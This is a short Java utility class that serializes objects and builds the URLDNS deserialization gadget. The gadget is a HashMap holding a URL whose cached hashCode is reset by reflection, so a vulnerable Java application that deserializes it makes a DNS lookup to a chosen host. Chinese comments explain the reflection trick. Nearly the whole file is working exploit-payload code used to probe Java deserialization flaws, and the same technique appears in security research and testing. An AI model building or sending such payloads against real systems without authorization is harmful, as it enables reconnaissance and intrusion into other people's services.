package Util;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class SerializableUtils {
    public static byte[] serializ(Object o) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(o);
        objectOutputStream.close();
        byte[] bytes = byteArrayOutputStream.toByteArray();
        byteArrayOutputStream.close();
        return bytes;
    }
    public static HashMap<URL, Integer> URLDNS(String urldns) throws Exception {
        HashMap<URL, Integer> hashmap = new HashMap<URL, Integer>();
        URL url = new URL(urldns);
        Class urlClass = url.getClass();
        Field field = urlClass.getDeclaredField("hashCode");//得到URL类的hashCode字段（默认为-1）
        //getDeclaredFields：获取当前类的所有字段，包括 protected/默认/private 修饰的字段；不包括父类public 修饰的字段。
        field.setAccessible(true);
        field.set(url, 3);//设置url的hashCode值为3
        hashmap.put(url, 1);//
        field.set(url, -1);

        ByteArrayOutputStream obj = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(obj);
        out.writeObject(hashmap);
//        return obj.toByteArray();
        return hashmap;
    }

}
